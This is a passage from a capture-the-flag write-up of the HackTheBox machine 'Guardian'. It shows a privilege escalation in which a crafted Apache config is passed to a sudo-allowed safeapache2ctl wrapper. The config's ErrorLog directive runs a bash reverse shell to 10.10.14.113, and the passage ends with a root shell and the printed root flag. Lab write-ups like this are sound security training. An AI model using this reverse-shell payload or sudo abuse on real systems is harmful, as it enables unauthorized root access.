    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
mark@guardian:/home/jamil$ sudo /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
mark@guardian:/home/jamil$ nano /home/mark/confs/shell.conf
mark@guardian:/home/jamil$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/shell.conf 
mark@guardian:/home/jamil$ 

```

## Shell as root

i then check for **[gtfobins](https://gtfobins.github.io/gtfobins/apache2ctl/)** but the available one was **[apache2ctl](https://manpages.debian.org/testing/apache2/apache2ctl.8.en.html)**.

But from my understanding, we need to insert **payload/revshells** in ``.conf`` that then will for ``sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/FILE.conf``

<img width="743" height="820" alt="image" src="https://github.com/user-attachments/assets/1da77d53-43f1-4b15-a4b7-cc035120482f" />

So i went to look for minimal conf for apache and all, but still it's not working. That's when i do my sanity check and refer from **[this](https://dudenation.github.io/posts/guardian-htb-release-area-machine/#apache-config)**.  

Payload used:
```
# shell.conf
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.113/1236 0>&1'"
```
Setup a listener
```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1236
[+] Listening for reverse shells on 0.0.0.0:1236 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
run the tools with the conf contain payload
```
mark@guardian:/home/jamil$ nano /home/mark/confs/shell.conf
mark@guardian:/home/jamil$ cat /home/mark/confs/shell.conf
# shell.conf
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.113/1236 0>&1'"
mark@guardian:/home/jamil$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/shell.conf 
```
**BOOM!** We then get shell
```
┌──(kali㉿kali)-[~/Desktop/HTB/Guardian]
└─$ penelope -p 1236
[+] Listening for reverse shells on 0.0.0.0:1236 →  127.0.0.1 • 192.168.134.128 • 10.10.14.113
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from guardian~10.10.11.84-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/guardian~10.10.11.84-Linux-x86_64/2025_10_25-04_26_07-156.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────
root@guardian:/etc/apache2# whoami
root
root@guardian:/etc/apache2# cat /root/root.txt
f7f31b57126f6dbb9e34b975953800b7
```
